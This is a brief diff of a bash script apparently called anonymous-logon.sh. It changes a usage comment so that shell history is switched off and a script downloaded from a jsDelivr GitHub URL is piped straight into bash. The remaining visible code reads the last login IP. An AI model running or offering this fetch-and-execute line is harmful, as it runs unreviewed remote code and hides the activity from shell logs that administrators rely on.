@@ -1,6 +1,7 @@
 #! /bin/bash
-#  set +o history && bash anonymous-logon.sh
-
+# 
+# set +o history && curl -s https://cdn.jsdelivr.net/gh/bashxlabs/bashx@main/centos/anonymous-logon.sh | bash
+#
 ip=$(last | head -n 1 | awk '{print $3}')
 if [ -z $ip ] ;
 then
